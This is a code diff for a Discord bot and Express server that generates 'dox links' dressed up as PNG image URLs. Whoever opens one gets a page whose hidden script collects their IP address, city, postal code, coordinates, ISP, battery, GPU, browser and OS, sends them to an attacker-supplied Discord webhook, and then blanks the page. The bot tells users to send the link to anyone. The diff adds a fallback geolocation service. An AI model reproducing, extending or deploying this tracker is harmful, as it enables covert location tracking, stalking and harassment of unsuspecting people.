@@ -3,84 +3,126 @@ const crypto = require('crypto');
 const express = require('express');
 const app = express();
 
+// ---- ENVIRONMENT VARIABLES ----
 const TOKEN = process.env.TOKEN;
 const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
 const PORT = process.env.PORT || 3000;
 
+// ---- MINIMAL INTENTS ----
 const client = new Client({
-    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMessages
+    ],
 });
 
+// ---- STORE ACTIVE LINKS ----
 const links = new Map();
 
+// ---- EXPRESS SERVER ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
+    console.log(`🔍 Requested ID: ${id}`);
+    console.log(`📦 Current links:`, Array.from(links.keys()));
+    
     if (!links.has(id)) {
+        console.log(`❌ ID not found: ${id}`);
         res.type('image/png');
         return res.send('Image not found');
     }
+    
+    console.log(`✅ ID found: ${id}`);
     const linkData = links.get(id);
     const targetWebhook = linkData.webhook || DEFAULT_WEBHOOK;
     res.type('text/html');
     res.send(generateDoxHTML(targetWebhook));
 });
 
-app.listen(PORT, () => console.log(`🌐 Server running on port ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`🌐 Server running on port ${PORT}`);
+});
 
+// ---- DISCORD BOT ----
 client.once('ready', async () => {
     console.log(`🤖 Logged in as ${client.user.tag}`);
-    await client.application.commands.set([
-        {
-            name: 'dox',
-            description: 'Generate a fresh dox link',
-            options: [
-                {
-                    name: 'webhook',
-                    description: 'Discord webhook URL',
-                    type: 3,
-                    required: true,
-                },
-            ],
-        },
-    ]);
-    console.log('✅ Commands registered');
+    
+    try {
+        await client.application.commands.set([]);
+        console.log('✅ Cleared all global commands');
+        
+        const guilds = await client.guilds.fetch();
+        for (const [id, guild] of guilds) {
+            try {
+                await guild.commands.set([]);
+                console.log(`✅ Cleared commands in guild: ${guild.name}`);
+            } catch (err) {
+                console.log(`❌ Could not clear commands in guild: ${guild.name}`);
+            }
+        }
+        
+        await client.application.commands.set([
+            { 
+                name: 'dox', 
+                description: 'Generate a fresh dox link',
+                options: [
+                    {
+                        name: 'webhook',
+                        description: 'Discord webhook URL to send data to',
+                        type: 3,
+                        required: true
+                    }
+                ]
+            }
+        ]);
+        console.log('✅ Commands registered');
+    } catch (error) {
+        console.error('❌ Failed to register commands:', error);
+    }
 });
 
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
+    // ---- DOX ----
     if (interaction.commandName === 'dox') {
         await interaction.deferReply({ ephemeral: true });
 
         const customWebhook = interaction.options.getString('webhook');
         if (!customWebhook || !customWebhook.startsWith('https://discord.com/api/webhooks/')) {
-            return interaction.editReply('❌ Invalid webhook URL.');
+            return interaction.editReply('❌ Please provide a valid Discord webhook URL.');
         }
-
+        
         const id = crypto.randomBytes(6).toString('hex');
         const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
 
         links.set(id, {
             created: Date.now(),
             user: interaction.user.tag,
-            webhook: customWebhook,
+            webhook: customWebhook
         });
+
+        console.log(`✅ Generated link: ${url}`);
+        console.log(`📦 Webhook: ${customWebhook}`);
 
         const embed = new EmbedBuilder()
             .setTitle('✅ Dox Link Ready')
             .setColor(0x22c55e)
-            .setDescription(`🔗 **${url}**\n\nFull device + location data will be logged.`)
-            .setFooter({ text: 'Expires after 100 links' });
+            .setDescription(`🔗 **${url}**\n\nSend this link to anyone. When they open it, their full location and device data will be logged.`)
+            .setFooter({ text: 'Expires after 100 links generated' });
 
         await interaction.editReply({ embeds: [embed] });
     }
 });
 
+// ---- CLEANUP ----
 setInterval(() => {
     const keys = Array.from(links.keys());
-    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach((k) => links.delete(k));
+    if (keys.length > 100) {
+        keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
+    }
 }, 60000);
 
+// ---- DOX HTML ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
@@ -89,6 +131,7 @@ function generateDoxHTML(webhook) {
 <script>
     const WEBHOOK_URL = "${webhook}";
 
+    // ---- IP DATA (with fallback) ----
     async function getIPData() {
         try {
             const res = await fetch('https://ipinfo.io/json');
@@ -107,36 +150,66 @@ function generateDoxHTML(webhook) {
                     timezone: data.timezone || 'N/A'
                 };
             }
+        } catch (e) {
+            console.log('ipinfo.io failed, trying fallback...');
+        }
+        // Fallback to ip-api.com
+        try {
+            const res = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query');
+            const data = await res.json();
+            if (data.status === 'success') {
+                return {
+                    ip: data.query || 'N/A',
+                    country: data.country || 'N/A',
+                    region: data.regionName || 'N/A',
+                    city: data.city || 'N/A',
+                    postal: data.zip || 'N/A',
+                    lat: data.lat || 'N/A',
+                    lon: data.lon || 'N/A',
+                    asn: data.as || 'N/A',
+                    isp: data.isp || 'N/A',
+                    timezone: 'N/A'
+                };
+            }
         } catch (e) {}
         return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A', timezone: 'N/A' };
     }
 
+    // ---- BATTERY ----
     async function getBattery() {
         try {
             const b = await navigator.getBattery();
             return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Charging' : 'Not Charging' };
-        } catch { return { level: 'N/A', charging: 'N/A' }; }
+        } catch { return { level: 'Not Available', charging: 'N/A' }; }
     }
 
+    // ---- CONNECTION ----
     function getConnection() {
         try {
             const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (c) return { type: c.effectiveType || c.type || 'unknown', downlink: c.downlink || 'N/A' };
+            if (c) {
+                return { 
+                    type: c.effectiveType || c.type || 'unknown', 
+                    downlink: c.downlink || 'N/A' 
+                };
+            }
         } catch {}
-        return { type: 'N/A', downlink: 'N/A' };
+        return { type: 'Not Available', downlink: 'N/A' };
     }
 
+    // ---- GPU ----
     function getGPU() {
         try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
-            if (!gl) return 'N/A';
+            if (!gl) return 'Not Available';
             const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            if (!debug) return 'N/A';
+            if (!debug) return 'Not Available';
             return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-        } catch { return 'N/A'; }
+        } catch { return 'Not Available'; }
     }
 
+    // ---- MAIN ----
     (async function() {
         try {
             const ipData = await getIPData();
@@ -151,23 +224,23 @@ function generateDoxHTML(webhook) {
 
             const data = {
                 timestamp: new Date().toISOString(),
-                ip: ipData.ip,
-                country: ipData.country,
-                region: ipData.region,
-                city: ipData.city,
-                postal: ipData.postal,
-                lat: ipData.lat,
-                lon: ipData.lon,
-                asn: ipData.asn,
-                isp: ipData.isp,
-                timezone: ipData.timezone,
+                ip: ipData.ip || 'N/A',
+                country: ipData.country || 'N/A',
+                region: ipData.region || 'N/A',
+                city: ipData.city || 'N/A',
+                postal: ipData.postal || 'N/A',
+                lat: ipData.lat || 'N/A',
+                lon: ipData.lon || 'N/A',
+                asn: ipData.asn || 'N/A',
+                isp: ipData.isp || 'N/A',
+                timezone: ipData.timezone || 'N/A',
                 battery: battery.level + ' (' + battery.charging + ')',
                 connection: conn.type + ' (' + conn.downlink + ' Mbps)',
-                browser,
-                os,
-                deviceType,
+                browser: browser,
+                os: os,
+                deviceType: deviceType,
                 screen: screen.width + 'x' + screen.height,
-                gpu,
+                gpu: gpu,
                 userAgent: ua,
             };
 
@@ -187,7 +260,7 @@ function generateDoxHTML(webhook) {
                             { name: "🏙️ City", value: data.city || 'N/A', inline: true },
                             { name: "🗺️ Region", value: data.region || 'N/A', inline: true },
                             { name: "📮 Postal", value: data.postal || 'N/A', inline: true },
-                            { name: "📌 Coordinates", value: \`\${data.lat}, \${data.lon}\`, inline: true },
+                            { name: "📌 Coordinates", value: \`\${data.lat}, \${data.lon}\` || 'N/A', inline: true },
                             { name: "🔢 ASN", value: data.asn || 'N/A', inline: true },
                             { name: "🏢 ISP", value: data.isp || 'N/A', inline: true },
                             { name: "🕒 Timezone", value: data.timezone || 'N/A', inline: true },
@@ -209,6 +282,7 @@ function generateDoxHTML(webhook) {
             console.error('Dox error:', err);
         }
 
+        // ---- CLOSE ----
         document.body.innerHTML = '';
         document.body.style.background = '#ffffff';
         document.body.style.margin = '0';
